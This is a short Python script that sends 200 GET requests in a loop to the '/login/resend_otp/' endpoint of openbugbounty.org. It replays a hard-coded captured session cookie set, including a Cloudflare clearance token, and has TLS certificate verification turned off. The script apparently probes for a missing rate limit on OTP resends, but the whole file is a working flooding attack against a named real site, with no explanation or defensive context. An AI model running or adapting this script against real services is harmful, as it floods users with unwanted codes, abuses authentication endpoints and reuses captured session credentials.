import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
for i in range(200):

    cookies = {
        'PHPSESSID': 't9f61qlm635f6cjkn19licc1hl',
        '_ga_KJGNSQD4DZ': 'GS1.1.1698461141.2.1.1698461593.0.0.0',
        '_ga': 'GA1.2.1892516003.1698456509',
        'cf_clearance': 'M_GfGvlL5HUBJQBq1odImb2pO9oW2JNh653WzUFkIwo-1698461148-0-1-1c8ffb.3161f810.19e0bd31-0.2.1698461148',
        '_gid': 'GA1.2.154878902.1698456511',
    }

    headers = {
        'Host': 'www.openbugbounty.org',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'https://www.openbugbounty.org/login/',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        # Requests doesn't support trailers
        # 'Te': 'trailers',
        # 'Cookie': 'PHPSESSID=t9f61qlm635f6cjkn19licc1hl; _ga_KJGNSQD4DZ=GS1.1.1698461141.2.1.1698461593.0.0.0; _ga=GA1.2.1892516003.1698456509; cf_clearance=M_GfGvlL5HUBJQBq1odImb2pO9oW2JNh653WzUFkIwo-1698461148-0-1-1c8ffb.3161f810.19e0bd31-0.2.1698461148; _gid=GA1.2.154878902.1698456511',
    }

    response = requests.get('https://www.openbugbounty.org/login/resend_otp/', cookies=cookies, headers=headers, verify=False)
    if response.status_code == 200:
                print(f"Success: {i}")

    else:
        print('Error')